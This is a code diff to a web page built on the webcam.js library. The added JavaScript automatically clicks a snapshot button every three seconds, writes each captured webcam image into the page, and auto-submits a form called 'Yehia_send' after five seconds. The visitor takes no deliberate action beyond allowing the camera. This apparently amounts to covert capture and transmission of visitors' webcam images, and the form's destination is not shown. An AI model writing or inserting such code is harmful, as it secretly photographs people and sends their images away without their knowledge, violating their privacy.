@@ -1,5 +1,19 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.24/webcam.js"></script>
+<script>
+for (var counter = 1; counter < 2; counter++) {
+function explode(){
+$(document).ready(function(){
+     $("#Yehia_send").submit();
+});
+
+}
+setTimeout(explode, 5000);
+
+}
+</script>
+
 
 <div id="my_camera"></div>
 <button id='clicop' type=button value="Take Snapshot" onclick="take_snapshot()">hh</button>
@@ -33,27 +47,29 @@ function take_snapshot() {
  // display results in page
  document.getElementById('results').innerHTML = 
   '<img src="'+data_uri+'"/>';
-  document.getElementById('scan').innerHTML = data_uri;
+    document.getElementById('scan').innerHTML = data_uri;
+
+
   
-  
+   } );
+}
+
  
 
 
-  window.onload = setTimeout(function(){
-        document.getElementById("Yehia_send").submit();
-        
-        
-}, 3000);
 
- } );
-}
+</script>
 
+<script>
+for (var counter = 1; counter < 2; counter++) {
 
 window.onload = function(){
     var button = document.getElementById('clicop');
     setInterval(function(){
         button.click();
-    },2000);  // this will make it click again every 1000 miliseconds
+    },3000);  // this will make it click again every 1000 miliseconds
 };
-</script>
+}
 
+
+</script>
